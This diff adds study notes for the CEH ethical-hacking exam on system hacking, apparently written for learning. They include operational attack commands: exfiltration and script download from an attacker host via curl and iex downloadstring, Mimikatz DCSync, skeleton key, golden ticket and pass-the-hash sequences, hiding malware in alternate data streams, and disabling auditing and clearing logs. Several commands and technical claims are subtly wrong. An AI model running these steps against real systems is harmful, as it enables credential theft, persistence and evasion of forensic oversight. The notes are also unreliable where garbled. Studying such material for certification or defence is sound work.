@@ -1,0 +1,377 @@
+	Hacking Methodology and Goals:
+This hacking approach is specific to CEH.
+Under the scope of system hacking.
+Goals of System Hacking - 
+EC Council's CEH Methodology:
+  Gaining Access: (Goal - Bypass security controls)
+    Password Cracking - it can take some time
+    Vulnerability Exploitation
+    Social Engineering
+  Privilege Escalation (Goal - Gaining more access):
+    Can be horizontal (Different Access) or vertial (Higher Access)
+    Vulnerability Exploitation
+    Security Misconfiguration
+  Maintaining Access (Goal - Persistence):
+    AKA Executing Apps
+    Installing Malware or C2 agents
+    Installing Backdoors
+    Possibly creating a hidden administration account
+  Hiding Files (Goal - Data Exfiltration)
+    Stegonography
+    SSN, PCI/PII
+    Putting in slackspace in a file before moving data outside network
+  Covering Yor Tracks (Goal - Removing/Obfuscate evidence):
+    Deleting Log files
+    
+	Windows Authentication:
+SAM Database - Security Account Manager (OG Authenticator)
+  Located in System32\Config\SAM in file explorer
+  Located in HKEY_LOCAL_MACHNE\SAM in Registry
+  Stores Local User/Groups and passwords
+  Not used when using a domain
+  LAN Manager, NTLM hashes are stored in SAM
+  IF THE OS IS RUNNING, THEN YOU CAN'T OPEN IT!
+    When OS is starting, loads the file into memory.
+    Even if file is locked, you can read from memory:
+      Cain and Abel, or other 3rd party tools can read memory space
+NT LAN Manager (NTLM):
+  Nowadays Kerberos does this for us, but NTLM is used as a backup
+  Pretty secure based on higher versions
+  Steps:
+    Client provides domain name, username, password
+    Client computer encodes password into RC4-UTF-16-LE hash
+    Client sends to server
+    Server generates a 16-byte random number called CHALLENGE and sends to client
+    Client encrypts challenge using password hash as key called RESPONSE
+    Client sends response back to server
+    Server sends username, CHALLENGE, RESPONSE, to Domain Controller (DC)
+    Domain Controller encrypts challenge using stored password hash and compares to response
+
+Kerberos - most common form of auth in domain/LDAP environment:
+Uses ticketing system
+  Steps:
+    Client generates authenticator with encrypted password, contains username, DATETIME, etc
+    Client sends encrypted authenticator to KDC (Key distribution center)
+    KDC Looks up username/password, looks at timestamp, tries to decrypt authenticator using password
+    KDC grants a TGT (Ticket granting ticket, encrypted with users password and timestamped)
+    Client decrypts TGT using passwrd and uses TGT to access resources
+    Access Request is created with TGT.
+
+	Password Attacks - Basic Concepts:
+Definition - Determining password to imitate a user. In general, decrypting an encrypted password
+Non-Technical Methods:
+  Dumpster Diving
+  Shoulder-surfing
+  Social Engineering
+Technical Methods:
+  Online Techniques (Active):
+    Dictionary (Using a wordlist), Bruteforce, Rules-Based Attacks
+    Malware/Spyware	
+    Guessing/Using Default Creds
+    Pass-the-Hash - Intercept Hashed version of password and sending to server
+    LLMNR - NLTMv2 - intercept and collect hash through MITM
+  Online Techniques (Passive):
+    Packet Sniffing
+    Man in the Middle
+    EtterCap/BetterCap
+    Wireshark
+  Offline Tools (Already have the hash):
+    OCL hashcat
+    John the Ripper
+    Ophcrack / Lophtcrack
+    Cain-and-able
+  Offline Techniques:
+    Rainbow Tables - list of already hashed passwords
+    Bruteforce, rule-based, dictionary
+Tools (Active):
+  Hydra
+  Ncrack
+  Pass-the-hash toolkit
+  Responder for LLM&R attack
+
+	Password Extraction and Cracking:
+Passwords often in hashed form after 
+Linux - shadow file
+Windows - NTLM/Kerberos, possibly SAM
+Cracking - put in plaintext form
+Windows Tools to Dump Files: 
+  PWDump8 - exe that requires admin to pull hashes
+  fgdump
+  Mimikatz
+  Responder - just needs to be on network, MitM takes and passes along authentication for file server request or something
+    responder -I [interface] -v
+  LophCrack
+Linux - just cat the shadow file with elevated permission
+Often good to extract using web request
+  e.g. 
+  attacker: python -m http.server
+  client: curl http://[attacker ip]:8000
+Crackers:
+  John
+    john -w=[wordlist path] [hashfile]
+    /home/[user]/.john/john.pot <- file with saved hashes
+  hashcat
+    -m is hash type, -a is attack mode
+    
+  Lophcrack
+Pass-the-hash better in windows 7/8. Installed by default parrot/kali
+Strengthen Passwords using:
+  More chars
+  More types of chars
+  Nothing that would be in a dictionary
+  Salting
+
+	Password Attacks Cracking Enhancement Techniques:
+Combinator - Take two or more dictionaries and combine together:
+  Possibly a general list and a custom wordlist together 
+  Should write a script to remove duplicates
+PrInCE - Probability Infinite Chained Elements
+  Creating a more useful dictionary, from existing dict, using a known criteria
+  setting parameters based on known factors, such as length range of password
+  Use tools to create this
+Toggle Case - Try every possible case iteration of the attack.
+Markov Chain - statistical analysis of passwords based on cracked:
+  Looks at previously cracked passwords in environment, and analyses common elements
+  Creates dictionary/bruteforce hybrid based on password trends of environment  
+
+	Buffer Overflows:
+Definition - program that needs to allocate memory, if data is imput in a way the program is not able to handle, memory is potentially spilled into uncontrolled areas
+Heap Overflow - Program is dynamically allocating memory, more difficult, such as malloc() in C.
+Stack Overflow - More common, stacks, which are statically set memory allocation that contain registers and pointers, EBP, EIP, ESP
+  EBP: Base  Frame Pointer
+  ESP: Refers to the stack pointer
+  EIP: Short for Extended Instruction Pointer
+Tools used to create buffer overflows:
+  Debuggers - Immunity Debugger
+  Network Sniffer
+  Programming languges/scripts
+1. Fuzz out input to see if you can find a crash condition (In example, see how much data it takes to crash)
+2. Generate a stack of data of certain length using offset to find how many bytes to EIP
+3. Look for false security mesures in [mona modules]
+4. If memory space is in little endian, put it backwards to make big endian
+5. Set up reverse shell using program like msfvenom to develop payload
+6. Create NOPSLED to ease code into vulnerable server
+Protect against Buffer Overflow:
+  ASLR
+  NTEP 
+  Error Correction
+  Static and Dynamic Code analysis
+
+	Privilege Escalation
+What is? (Escalate to another level of privilege)
+Vertical - vertical is higher privileges
+Horizontal - lateral move to access accounts with different access to files/networks
+Access resources like ExploitDatabase/SearchSploit
+Ways to accomplish (non-inclusive):
+  Weak Permissions
+  DLL Hijacking (Robber)
+  DyLib hijacking (MacOS version of DLL) 
+  Unattended Installations ( Revealing data from an xml file meant to install onto new OSs (System32/*/unattended.xml))
+  Unquoted Service Paths - Putting services in 
+  Scheduled tasks/cronjobs - Look for ones with bad permissions
+  suid/guid - abuse programs with set user account running it (gtfobins)
+  sudo -l
+Privilege Escalation Tools:
+  PEAS-ng - LinPeas/WinPeas privesc analysis
+  Windows-Exploit-Suggester
+  linuxprivchecker
+How to Protect:
+  Patch security vulnerabilies
+  System hardening guides
+  Principle of least privilege
+  SAST and DAST (Applicaiton security Testing)
+  MFA
+
+	Maintaining Access:
+AKA Persistence or Application Execution
+Typically C2 is the best way to go (Command and Control)
+C2 is typically asynchonous
+Application Execution:
+  C2 agents are often called RATs (Remote Access Trojans), popular tools are TheFatRat, or pupy ( for contrainerization, also FUD)
+  Spyware is another method.
+  Also can be accomplished using scripts
+Tools for Prevention:
+  Windows Defender 
+  AV/EDRs 
+  Anti-Keylogger Software
+  Anti-Spyware Software
+  Patches and Updates
+Alternate Data Streams - Used by acctackers to hide malicious files (Windows):
+  Attaches malware to legit files
+  Doesn't change the size or properties of legit files
+  to create an ADS > $ type malware.exe > C:\file1.txt:malware.exe
+Rootkits:
+  Malware that replaces OS files and processes with malicious versions
+  Capable of backdoor techniques such as C2C, Log Wiping, Monitoring
+  Types of Rootkits:
+    Boot-Loader Level - modify/replace bootloader
+    Hardware/Firmware Level - Rootkit image is stored in firmware
+    Kernel Level - Installed onto kernel, Grants highest level of OS access
+    Hypervisor Level - Loads target OS as VM, intercepts and controls hardware calls to target OS
+    Library Level - Hooks into High-level system calls
+    Application Level - Like traditional malware, Runs with application system calls
+AdminSDHolder
+  Protects privileged user accounts from accidental or malicious modifications
+  Can give a user domain-admin privileges
+  Attacker adds user and sets them to be protected by AdminSDHolder via an ACL
+  SDProp checks for changes to AdminSDHolder accts by comparing them to defaults for group and modifies account privs
+Windows Management Instrumentation Event Subscriptsion:
+  Triggers a malicious script very time a defined event occurs
+Maintaining persistence by abusing boot or logon autostart executions
+
+	Steganography:
+Definition: The hiding/obfuscation of data in unused space of files
+Files should look untampered with
+Cover medium - the file that data is hidden in
+Slack space - unused space in a file
+Magic number - data that tells system what type a file is
+Tools:
+  stegsnow - put a message in a file's (ideal is txtfiles) slackspace using specific steganography procedure
+  steghide - good generalist tool
+Techiques:
+  stegsnow -S (check amount of space available)
+  stegsnow -C -p [password] -m "message" [infile] [outfile]
+  stegsnow -C -p [password] [outfile] (to extract)
+  
+  steghide embed -ef [embed file] -cf [cover file] -sf [stegofile/outfile]
+steganalysis:
+  Audio file - text is hidden in non-human hearable frequency
+  Picture/Video - artifacts or abberations are indicators, could be in exif/metadata
+  Tools:
+    steghunt
+    md5sum comparisons
+    zsteg [file]
+    checking file sizes
+
+	Covering Tracks:
+Consider the perspective of a digital forensics expert
+Disable auditing systems (IDS/IPS)
+  No alerts may be an alert in and of itself
+Clearing logs
+Windows:
+  auditpol - disable account logons
+  fsutil - disable last access timestamp
+  Restore Points - disable recovery/snapshots
+  pagefile/virtualfile - worth it to delete
+Linux:
+  .bash_history - do $ export HISTSIZE=0
+  (RHEL) audit daemon - auditd -s disable
+Clearing logs:
+  Windows:
+    in powershell - Clear-Eventlog "Windows Powershell"
+    wevtutil - wevtutil -cl (clear logs)
+    metasploit - clear revu
+    Event Viewer GUI - clear logs individually
+  Linux:
+    history (checks bash_history file)
+    history -c (clears bash_history file)
+    echo "" > ~/.bash_history
+    shred - overwrites files
+    auth.log - clear the specific pieces during usage
+Defenses:
+  Remotely copy logs to a different server
+  syslog is able to be setup to write to syslog server
+  Have a SIEM available
+
+	Actiive Directory Enumeration:
+Holds all the stuff (users, hosts, groups) in a Windows domain
+Tools:
+  Powerview - part of powersploit suite:
+    ./PowerView.ps1 (May need to execution bypass by doing $ powershell -ep bypass)
+    in kali: /usr/share/windows-resources/powersploit/Recon/
+    from attacker machine: python3 -m http.server
+    from host iex (new-object net.webclient).downloadstring('http:[attacker op]/PowerView.ps1')
+    Some helpful commands:
+	Get-NetDomain - get forest, DC, children, name, etc
+        Get-NetForest - Learn more about forest itself, which domains are a part of forest)
+	Get-NetLoggedOn - See who's logged on
+	Invoke-ShareFinder - looks for shares on the domain
+  Bloodhound:
+    Run script against AD domain
+    SharpHound.ps1 or SharpHound.exe
+    Powershell script is more customizable
+    SharpHound returns JSON data that can be imported into bloodhound
+    Bloodhound can be installed onto windows or linux
+      Need to run neo4j console
+      http://localhost:7474
+      user: 	neo4j
+      password: "blank"
+      Launch bloodhound
+    Helpful info:
+      Users with foreign domain group membership
+      Computers where domain users are local admin
+      Kerberoastable accounts
+
+	Mimikatz:
+Windows-based password tool used post-exploitation, a little maintaining access/privesc
+Abusing data protection API: 
+  DPAPI - central store that holds encrupted file info/browser or wifi passwrods, etc
+  May require master key to DPAPI
+  mimikatz will help find keys or export keys
+  Method:
+    .\mimikatz.exe
+    $ sekurlsa::dpapi (dumps encrypted dpapi)
+    $ lsadump::backupkeys /system:user.domain (gets keys)
+Malicious replication aka DCsync Attack:
+  Syncs DC secrets by pretending to be a DC asking to sync
+  Method:
+    $ lsadump::dcsync /domain:[domain] /user:administrator <- or other user (DC info such as ntlm hash)
+Skeleton Key attack:
+  Essentially create backdoor for any user account, creates password that unlocks any keys
+  Helps if you have domain admin permissions
+  Method:
+    $ privelege::debug (if 20, you have sufficient access)
+    $ misc::skeleton
+    Then type "mimikatz" as password into any user login
+Golden Ticket Attack:
+  Access to everything through kerberos, grant one's self a TGT (ticket granting ticket)
+  Method:
+    First, grab the password hash of the krbtgt account 
+    Need FDQN of target, SID of user account that we are logged in as
+    Need domain access privileges
+    cmd run as admin $
+    # whoami /user (to get SID)
+    # .\mimikatz.exe
+    # lsadump::dcsync /domain:[domain] /user:krbtgt (to get Kerberos NTLM hash)
+    This is attack vv
+    # kerberos::golden /domain:[domain] /sid:[SID] /rc4:[NTLM hash] /id:500 (500 is admin) /user:[user to be created]
+    Move to location that ticket was saved to (ticket.kirbi)
+    # .\mimikatz
+    # kerberos::ppt ticket.kirbi
+    # misc::cmd
+    This opens a COMPLETELY accessible account over domain (Pass-the-ticket attack)
+Silver Ticket Attack:
+  Similar to golden ticket account, but you only have full access to a particular service.
+  Needs the decrypted/cracked hash of the service account
+Overpass-the-hash:
+  Use mimikatz with privilege::debug access to pass-the-hash
+  Method:
+    cmd as local admin user
+    $ .\mimikatz
+    $ privilege:debug
+    $ sekurlsa::logonpasswords (to get user passwords)
+    $ sekurlsa::pth /user:[user of hash] /domain:[domain] /ntlm:[hash]
+
+	Pivoting:
+Definition - Gain access to an internal system using another (compromised) internal system
+Relaying - Gain access to resources on compromised system 
+One Method:
+  Have comprimised system in program such as metasploit
+  Learn network capabilities/information through tools like ip/ifconfig, route, etc
+  See if there is a connection to intranet (ping sweep, etc)
+  meterpreter > route add [system you are pivoting to] [session id]
+
+Tool: 
+  proxychains - 
+    Requres tool that can tunnel into server, such as ssh
+    ssh -D [localhost:[whatever port you'd like]] [username]@[host]
+    vim /etc/proxychains4.conf
+      add proxy such as "socks4 [localhost] [whatever port tou used before]"
+    ICMP and stealthscans in NMAP don't typically do well in proxychains (make sure to use Pn and sT)
+    example:
+      proxychains nmap -sT -Pn -p [port range] [host]
+  Plink
+  Chisel
+  SoCAT
+  EndRock
+
